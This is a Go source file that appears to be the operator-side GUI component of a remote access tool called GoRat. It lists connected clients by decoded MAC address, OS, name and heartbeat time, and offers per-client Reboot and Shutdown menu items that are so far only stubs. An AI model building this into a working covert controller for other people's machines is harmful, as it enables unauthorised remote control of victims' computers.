package components

import (
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	go_rat "github.com/AllenDang/giu"
	"github.com/NotKatsu/GoRat/modules/database"
	"github.com/pterm/pterm"
)

var currentNotificationState bool = true

type EncodedDataStruct struct {
	MACAddress string
	OS         string
	Name       string
}

func notificationStateText() string {
	if currentNotificationState == true {
		return "Turn Notifications Off"
	} else {
		return "Turn Notifications On"
	}
}

func updateNotifcationState() {
	if currentNotificationState == true {
		currentNotificationState = false
	} else {
		currentNotificationState = true
	}
}

func CreateClientContextMenu(MACAddress string) *go_rat.ContextMenuWidget {
	return go_rat.ContextMenu().Layout(
		go_rat.Label(fmt.Sprintf("Operations for %s", MACAddress[0:11]+"...")),

		go_rat.TreeNode("System").Layout(
			go_rat.Selectable("Reboot").OnClick(func() {
				fmt.Println("Hello World")
			}),
			go_rat.Selectable("Shutdown").OnClick(func() {
				fmt.Println("Hello World")
			})),

		go_rat.Selectable(notificationStateText()).OnClick(updateNotifcationState))

}
func CreateClientTable() []*go_rat.TableRowWidget {
	rows := make([]*go_rat.TableRowWidget, 0)
	connections := database.GetConnections()

	for _, conn := range connections {
		storedTime, err := time.Parse("2006-01-02 15:04:05.999999999-07:00", conn.LastHeartbeatTime)

		if err != nil {
			pterm.Fatal.WithFatal(true).Println(err)
		}
		currentTime := time.Now()
		timeDifference := currentTime.Sub(storedTime)

		if timeDifference.Seconds() < 5 {
			substrings := strings.Split(conn.ID, ".")

			NewEncodedDataStruct := EncodedDataStruct{}

			for i, encodedData := range substrings {
				if i == 0 {
					decodedMacAddress, _ := base64.URLEncoding.DecodeString(encodedData)
					NewEncodedDataStruct.MACAddress = string(decodedMacAddress)

				} else if i == 1 {
					decodedOperatingSystem, _ := base64.URLEncoding.DecodeString(encodedData)
					NewEncodedDataStruct.OS = string(decodedOperatingSystem)
				} else if i == 2 {
					decodedName, _ := base64.URLEncoding.DecodeString(encodedData)
					NewEncodedDataStruct.Name = string(decodedName)
				}
			}

			connectionTime := database.GetConnectionTime(conn.ID)
			layout := "2006-01-02 15:04:05.9999999-07:00"

			dbTime, err := time.Parse(layout, connectionTime)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			}
			outputLayout := "15:04:05 02/01/2006"

			outputTimeStr := dbTime.Format(outputLayout)

			row := go_rat.TableRow(
				go_rat.Label(fmt.Sprintf("%v", NewEncodedDataStruct.MACAddress)), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
				go_rat.Label(fmt.Sprintf("%v", NewEncodedDataStruct.OS)), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
				go_rat.Label(fmt.Sprintf("%v", NewEncodedDataStruct.Name)), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
				go_rat.Label(fmt.Sprintf("%v", outputTimeStr)), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
			)

			rows = append(rows, row)
		}
	}

	if len(rows) == 0 {
		row := go_rat.TableRow(
			go_rat.Label(""),
			go_rat.Label(""),
			go_rat.Label(""),
			go_rat.Label(""),
		)

		rows = append(rows, row)
		return rows
	} else {
		return rows
	}
}

func CreateClientArray() []string {
	var activeConnections []string
	connections := database.GetConnections()

	activeConnections = append(activeConnections, "Listening on port 8080...")

	for _, conn := range connections {
		storedTime, err := time.Parse("2006-01-02 15:04:05.999999999-07:00", conn.LastHeartbeatTime)

		if err != nil {
			fmt.Println("Error parsing time:", err)
		}
		currentTime := time.Now()
		timeDifference := currentTime.Sub(storedTime)

		splitStrings := strings.Split(conn.ID, ".")
		connectionID, _ := base64.URLEncoding.DecodeString(splitStrings[0])

		if timeDifference.Seconds() < 5 {
			connectionString := "New Connection from " + string(connectionID)
			activeConnections = append(activeConnections, connectionString)

		} else if timeDifference.Seconds() > 5 {
			connectionString := "New Connection from " + string(connectionID) + " (Disconnected)"
			activeConnections = append(activeConnections, connectionString)
		}
	}
	return activeConnections
}
